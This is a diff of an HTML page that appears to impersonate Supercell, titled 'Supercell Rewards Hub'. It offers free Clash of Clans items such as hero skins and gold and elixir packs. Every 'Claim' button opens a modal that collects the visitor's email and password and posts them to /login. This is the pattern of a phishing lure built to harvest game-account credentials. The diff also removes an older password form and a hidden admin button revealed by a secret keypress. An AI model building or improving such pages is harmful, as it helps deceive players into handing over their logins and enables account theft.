@@ -1,22 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Supercell Rewards Hub</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Keep your original Zite content here -->
 
-    <form action="/submit" method="POST">
-        <input type="email" name="email" placeholder="Email" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Submit</button>
-    </form>
+    <!-- Header -->
+    <header>
+        <h1>Supercell Rewards Hub</h1>
+        <p>Claim your Clash of Clans rewards now!</p>
+    </header>
 
-    <button id="hiddenAdminBtn" style="display:none;position:fixed;bottom:10px;right:10px;padding:10px 15px;">Admin</button>
+    <!-- Products Section -->
+    <section class="rewards">
+        <div class="product">
+            <img src="images/reward1.jpg" alt="Reward 1">
+            <h3>Hero Skin Bundle</h3>
+            <button onclick="openLogin()">Claim</button>
+        </div>
+        <div class="product">
+            <img src="images/reward2.jpg" alt="Reward 2">
+            <h3>Base Scenery Pack</h3>
+            <button onclick="openLogin()">Claim</button>
+        </div>
+        <div class="product">
+            <img src="images/reward3.jpg" alt="Reward 3">
+            <h3>Gold & Elixir Pack</h3>
+            <button onclick="openLogin()">Claim</button>
+        </div>
+        <div class="product">
+            <img src="images/reward4.jpg" alt="Reward 4">
+            <h3>Exclusive Clan Badge</h3>
+            <button onclick="openLogin()">Claim</button>
+        </div>
+    </section>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeLogin()">&times;</span>
+            <h2>Login to Claim</h2>
+            <form action="/login" method="POST">
+                <input type="email" name="email" placeholder="Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
     <script>
-    document.addEventListener('keydown',e=>{if(e.key==='¥'){document.getElementById('hiddenAdminBtn').style.display='block';}});
-    document.getElementById('hiddenAdminBtn').onclick=()=>window.location.href='/admin';
+        function openLogin() {
+            document.getElementById('loginModal').style.display = 'block';
+        }
+        function closeLogin() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
     </script>
+
 </body>
 </html>
